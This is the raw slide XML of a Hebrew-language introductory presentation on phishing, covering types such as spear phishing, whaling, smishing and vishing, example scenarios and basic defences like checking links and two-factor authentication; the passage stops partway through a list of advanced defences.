          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="73141508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B328169F-D3D8-4509-ABBB-11701F0253F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0"/>
              <a:t>(Phishing</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="86368324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5180B79-6A79-4F67-83E7-4CBBF8785960}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1898374" y="966610"/>
            <a:ext cx="9226826" cy="1384989"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="5400" dirty="0"/>
              <a:t>מבוא להתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="5400" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="5400" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5400" dirty="0"/>
              <a:t>(Phishing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="5400" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" sz="5400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9FF8E91-787B-4DE2-BDDC-28A32AAB7830}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא אחת מהתקפות הסייבר הנפוצות והמסוכנות ביותר בעולם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האבטחת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המידע. המטרה העיקרית של התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא להטעות את הקורבן ולגרום לו לחשוף מידע רגיש, כמו סיסמאות, מספרי כרטיסי אשראי, פרטי חשבון בנק ועוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור לדוגמה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לך חבר בשם דני. יום אחד דני קיבל אימייל שנראה כאילו הוא נשלח מהבנק שלו. באימייל נכתב שהבנק שלו זיהה פעילות חשודה בחשבונו ומבקש ממנו ללחוץ על קישור כדי לאמת את זהותו. דני, בלי לחשוב פעמיים, לוחץ על הקישור ומוזמן להכניס את פרטי החשבון והסיסמה שלו. מה שדני לא יודע זה שהאימייל נשלח על ידי תוקף שמתחזה לבנק, והקישור מוביל לאתר מזויף שנראה בדיוק כמו האתר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הבנק. ברגע שדני מכניס את הפרטים שלו, הם נשלחים ישירות לתוקף, ודני עלול לאבד את כספו או לחשוף מידע רגיש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22426329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1486E46-24B8-4E07-A13A-79C489E27198}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6689034" y="642594"/>
            <a:ext cx="4436165" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0D35C56-C0FE-41AE-9DA0-C15828CE0595}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4112286"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך אימייל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Email Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף שולח אימיילים המתחזים לארגון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומבקש מהקורבן להיכנס לאתר מזויף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ממוקד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Spear Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה ממוקדת יותר, כאשר התוקף אוסף מידע על הקורבן ומתקיף אותו באופן אישי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ממוסך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Whaling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה ממוקדת על דמויות בכירות בארגון, כמו מנכ"לים ומנהלים בכירים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :SMS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Smishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בהודעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SMS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להטעות את הקורבן ללחוץ על קישור זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך טלפון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Vishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מתקשר ומתחזה לנציג שירות כדי להוציא מידע רגיש מהקורבן.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="379769455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3833F3F-C9A0-402B-9A71-D5FC0DB2BC0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5933660" y="642594"/>
            <a:ext cx="5191539" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A86F4CEA-F95F-4297-91FC-0FA82A9E2516}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה 1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך אימייל</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שעובד בחברה מקבל אימייל שנראה כאילו הוא הגיע ממחלקת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של החברה. באימייל נאמר שיש לבצע עדכון סיסמא ומצורף קישור לאתר שבו ניתן לעדכן את הסיסמא. העובד לוחץ על הקישור, שמוביל לאתר מזויף המתחזה לאתר של החברה. לאחר שהוא מכניס את שם המשתמש והסיסמא, התוקף מקבל את הפרטים ומתחבר לחשבון של העובד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ממוקד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף אוסף מידע על מנהל בכיר בארגון דרך רשתות חברתיות ופרופילים ציבוריים. לאחר מכן, התוקף שולח למנהל אימייל המתחזה להיות מבוסס על מידע אישי של המנהל, כמו פרטי פרויקט שהמנהל עובד עליו. המנהל, שמזהה את המידע ונראה לו לגיטימי, לוחץ על הקישור ונופל קורבן להתקפה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9804012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2FA001-698E-4B1A-B0CD-5CF8E13ADE7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4015409" y="642594"/>
            <a:ext cx="7109791" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד להתגונן מפני התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D71D3F3-00EF-4EB1-BA7A-E928E4B45DD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. אימות מקור האימייל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תמיד לבדוק מי השולח ולהיזהר מאימיילים עם כתובות חשודות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. בדיקת קישורים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לפני שלוחצים על קישור, לעבור עם העכבר עליו ולראות את הכתובת המלאה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. אימות דו-שלבי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש באימות דו-שלבי להוסיף שכבת אבטחה נוספת לחשבונות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. חינוך והכשרה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: להדריך עובדים ומשתמשים איך לזהות ולהתמודד עם התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>5. תוכנות אנטי-וירוס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>ופיירוול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בתוכנות אבטחה כדי לזהות ולחסום התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2094552782"/>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DC0C13-62CA-45D6-8269-D62103197BCD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5247860" y="642594"/>
            <a:ext cx="5877339" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>טכניקות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתקדמות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{82F2F335-727E-42F3-9B83-17523F2CE7FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך אתרים מזויפים: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחת השיטות המתקדמות היא יצירת אתר מזויף שנראה בדיוק כמו אתר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. התוקף שולח לקורבן קישור לאתר המזויף, ובו מתבקש להכניס פרטי התחברות או מידע אישי. ברגע שהקורבן מכניס את הפרטים, הם נשלחים לתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> דרך מדיה חברתית: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים יכולים להשתמש ברשתות חברתיות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פייסבוק</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לינקדאין</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>טוויטר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לאסוף מידע על הקורבנות שלהם. הם יוצרים פרופילים מזויפים ומתקשרים עם הקורבנות, במטרה להשיג מידע אישי או לשכנע אותם ללחוץ על קישורים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> מבוסס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>נוזקות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Malware-based Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפה זו, הקורבן מקבל אימייל או הודעה המכילה קובץ מצורף עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>נוזקה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. כשפותחים את הקובץ, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הנוזקה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מותקנת על המחשב של הקורבן ומתחילה לגנוב מידע או לבצע פעולות זדוניות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="416380213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09C153F-6CC0-4DAE-8CF6-C904193B97E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1351722" y="642594"/>
            <a:ext cx="9773478" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>טכניקות מתקדמות להתגוננות מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05C12B58-7B9C-4238-AAD4-A7632D073C2B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. חינוך מתקדם והדרכה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לימוד עובדים ומשתמשים על סוגי התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, איך לזהות אותן, ומה לעשות במקרה של חשד. ניתן לערוך סימולציות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להעמיק את הידע והמיומנויות שלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. שימוש בתוכנות נגד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
